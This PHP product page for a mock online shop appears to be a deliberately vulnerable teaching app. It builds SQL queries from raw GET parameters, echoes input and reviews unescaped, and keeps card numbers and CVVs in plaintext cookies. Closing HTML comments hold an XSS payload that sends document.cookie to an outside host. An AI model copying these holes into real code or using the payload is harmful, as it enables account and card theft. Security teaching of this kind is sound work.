<?php
include("config.php");
include("header.php");
//phpinfo();
//print_r($_COOKIE);
$product = $_GET["product"];

$q = "SELECT * FROM product WHERE id = $product";

$r = mysql_query($q);
?>
<div>

<div style="border: 1px solid #C9C9C9; width: 300px; padding: 5px 10px; margin: 10px 0 10px 0; font-size: 12px; font-weight: bold;">
You Are Here: <a href="/">Home</a> &nbsp;&raquo;&nbsp; Product <?= $product ?></b>
</div>

<?php

//add review
if (isset($_GET["email"]) && isset($_GET["comment"]) && isset($_GET["submitcomment"]) && isset($_GET["product"])) {

	//no input sanitisation big vulnerability
	//no check for blank input
	$qc = "INSERT INTO product_comments VALUES (NULL, ".$_GET["product"].", '".$_GET["email"]."', '".$_GET["comment"]."')";
	$rc = mysql_query($qc);
	if ($rc) {
		?>
		<div style="border: 1px solid #C9C9C9; width: 300px; padding: 5px 10px; margin: 10px 0 10px 0; font-size: 12px;">
		Your Review has been added. Scroll to the bottom to check.
		</div>
		<?php
	}

}

//process purchase
//add review
//print_r($_GET);
if (isset($_COOKIE["email"]) && isset($_GET["action"]) && isset($_GET["qty"]) && isset($_GET["cc"]) && 
	isset($_GET["cctype"]) && isset($_GET["product"]) && 
	isset($_GET["cvv"]) && isset($_GET["expiry"]) && isset($_GET["processpurchase"])) {

	//no input sanitisation big vulnerability
	//no check for blank input
	setcookie("cc",$_GET["cc"]);
	setcookie("cvv",$_GET["cvv"]);
	setcookie("cctype",$_GET["cctype"]);
	setcookie("expiry",$_GET["expiry"]);

	$qc = "INSERT INTO transaction (uid,prodid,ccnumber,cvvnumber,expiry,qty) VALUES 
			('".$_COOKIE["email"]."', ".$_GET["product"].", '".$_GET["cc"]."', 
				'".$_GET["cvv"]."', '".$_GET["expiry"]."', ".$_GET["qty"].")";

	$rc = mysql_query($qc);
	if ($rc) {
		?>
		<div style="border: 1px solid #C9C9C9; width: 300px; padding: 5px 10px; margin: 10px 0 10px 0; font-size: 14px;">
		<span style="color: green;">Congrats!</span> Your order has been placed. You will get an email soon about this transaction.
		</div>
		<!--<script></script>-->
		<?php
	}

}


//fetch product info

if (mysql_num_rows($r) == 0) {
	echo "<br /><br />No Product Found";
} else {
	while ($row = mysql_fetch_array($r)) {

		?>
		<div id="produc-<?= $row["id"] ?>" class="product">
			<div style="border: 1px solid #C9C9C9; width: 300px; padding: 10px; margin: 10px 0 10px 0;">
				<div class="title">
					<span style="font-size: 20px; text-transform:capitalize"><?= $row["name"] ?></span>
					<br />
					<br />
				</div>
				<div class="image" style="width: 100%;">
					<img style="width: 100%;" src="/images/<?= $row["picurl"] ?>" />
				</div>
			</div>
			<div style="border: 1px solid #C9C9C9; width: 300px; padding: 10px; margin: 10px 0 10px 0;">
				<div class="price">
					Price: <b>$<?= $row["price"] ?></b>
				</div>
				<div class="buyproduct">
					<a href="javascript:buyform()">Buy this&rarr;</a>
				</div>
				<div id="buyform" style="display: none; font-size: 12px;">
					<br />
					<?php if (isset($_COOKIE["email"])) { ?> 
					<form action="product.php?product=<?= $_GET['product'] ?>" method="GET">
						<input type="hidden" name="product" value="<?= $_GET['product'] ?>" />
						<input type="hidden" name="action" value="buy" />
						Enter Quantity:<br />
						<input type="text" name="qty" /><br />						
						<br />Enter Credit Card Number:<br />
						<input type="text" name="cc" size="16" maxlength="16" value="<?= $_COOKIE["cc"]?>"  /><br />
						<br />Choose Credit Card Type:<br />
						<input type="text" name="cctype" value="<?= $_COOKIE["cctype"]?>"  /><br />
						<br />Enter CVV Number:<br />
						<input type="text" name="cvv" value="<?= $_COOKIE["cvv"]?>" /><br />
						<br />Enter Expiry (mm/dd/yyyy):<br />
						<input type="text" name="expiry" value="<?= $_COOKIE["expiry"]?>" /><br />
						<br /><input type="submit" name="processpurchase" value="Continue" />
					</form>
					<?php } else { ?>
						Please <a href="signin.php?next=<?= $_GET['product'] ?>">Sign-In</a> To purchase
					<?php } ?>
				</div>					

			</div>		
		</div>
		<?php

	}


	//Add Comments form
	//XSS Vulnerability
	//can add comment to any product vulnerability

	?>
	<div style="border: 1px solid #C9C9C9; width: 300px; padding: 10px; margin: 10px 0 10px 0;">
		Add a Review:<br /><br />
		<form action="product.php?product=<?= $_GET['product'] ?>" method="GET">
			<input type="hidden" name="product" value="<?= $_GET['product'] ?>" />
			<input type="text" name="email" placeholder="Enter Email" value="<?= $_COOKIE['email'] ?>" /><br />
			<textarea name="comment"></textarea><br />
			<input type="submit" name="submitcomment" value="Submit Comment" />
		</form>
	</div>

	<div style="border: 1px solid #C9C9C9; width: 300px; padding: 10px; margin: 10px 0 10px 0;">
	<?php

	//Todo Fatch Comments

	$qcc = "SELECT * FROM product_comments WHERE productid = $product";
	$rcc = mysql_query($qcc);

	if (mysql_num_rows($rcc) == 0) {
	echo "No Reviews to show";
	} else {
		echo "<b>Latest Reviews</b><br /><br />";
		while ($row = mysql_fetch_array($rcc)) {

			?>
			<div id="comment-<?= $row["id"] ?>" class="product">
				<div class="user">
					<ul><li><?= $row["email"] ?> <em>says</em> <?= $row["comment"] ?></li></ul>
				</div>
			</div>
			<?php

		}

	}

}
?>
	</div>

</div>

<?php 
	include("footer.php"); 
?>

<!-- Chrome has AntiXSS filter so cool - http://blog.securitee.org/?p=37 -->
<!-- Steal cookies using XSS -->
<!-- http://amazon.two/product.php?product=%3Cscript%3Enew%20Image%28%29.src=%22http://google.com%22%3C/script%3E-->

<!-- add this as comment to show xss attack -->
<!-- http://amazon.two/product.php?product=<script>new Image().src="http://good.site/iamgood/showimage.php?"+document.cookie</script> -->
<!-- html injection vulnerability for breadcrumb -->
<!-- python script to demonstrate CSRF vulnerability-->